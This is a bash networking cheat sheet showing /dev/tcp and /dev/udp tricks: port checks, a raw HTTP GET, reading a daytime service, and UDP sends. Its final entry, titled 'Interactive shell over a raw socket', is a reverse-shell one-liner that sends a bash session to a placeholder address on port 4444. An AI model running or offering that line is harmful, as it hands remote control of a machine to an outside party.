# Networking

### TCP port check
```bash
timeout 2 bash -c ': > /dev/tcp/example.com/80' && echo open
```

### HTTP GET without curl
```bash
exec 3<>/dev/tcp/example.com/80
printf 'GET / HTTP/1.0\r\nHost: example.com\r\n\r\n' >&3
cat <&3
exec 3>&-
```

### Read a plaintext network service
```bash
exec 4<>/dev/tcp/time.nist.gov/13
cat <&4
exec 4>&-
```

### Two-way interactive socket
```bash
exec 5<>/dev/tcp/example.com/80
cat <&5 &
cat >&5
exec 5>&-
```

### UDP datagram
```bash
exec 6<>/dev/udp/127.0.0.1/9999
echo ping >&6
exec 6>&-
```

### Interactive shell over a raw socket
```bash
bash -i >& /dev/tcp/192.0.2.1/4444 0>&1
```
